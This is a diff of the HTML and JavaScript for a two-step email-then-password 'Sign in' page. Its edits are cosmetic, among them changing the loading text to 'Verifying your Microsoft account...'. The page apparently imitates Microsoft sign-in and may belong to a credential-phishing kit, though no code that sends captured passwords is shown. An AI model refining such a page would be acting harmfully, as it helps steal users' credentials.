@@ -480,6 +480,8 @@
                 <span id="enteredEmail"></span>
             </div>
 
+
+
             <div class="header">
                 <h1 id="headerTitle">Sign in</h1>
             </div>
@@ -701,24 +703,14 @@
             document.getElementById('emailForm').style.display = 'block';
             document.getElementById('passwordForm').style.display = 'none';
             document.getElementById('successForm').style.display = 'none';
-            document.getElementById('headerTitle').textContent = 'Sign in';
+            document.getElementById('headerTitle').textContent = 'Sign in ';
             document.getElementById('emailInput').value = ''; // Clear email input
-            
-            // Hide the back-info when returning to email form
-            document.getElementById('backInfo').classList.remove('visible');
-            document.getElementById('enteredEmail').textContent = '';
-            
             clearMessage();
         }
 
         function showPasswordForm(email) {
             currentStep = 'password';
             verifiedEmailAddress = email; // Store the verified email
-            
-            // Show email above the header
-            document.getElementById('enteredEmail').textContent = email;
-            document.getElementById('backInfo').classList.add('visible');
-            
             document.getElementById('verifiedEmailDisplay').textContent = `${email}`;
             document.getElementById('passwordInput').value = ''; // Clear password input
             document.getElementById('passwordInput').focus();
@@ -795,7 +787,7 @@
             }
 
             clearMessage();
-            setLoading(true, 'Trying to sign you in', false);
+            setLoading(true, 'Verifying your Microsoft account...', false);
 
             try {
                 // First, verify if the email account exists
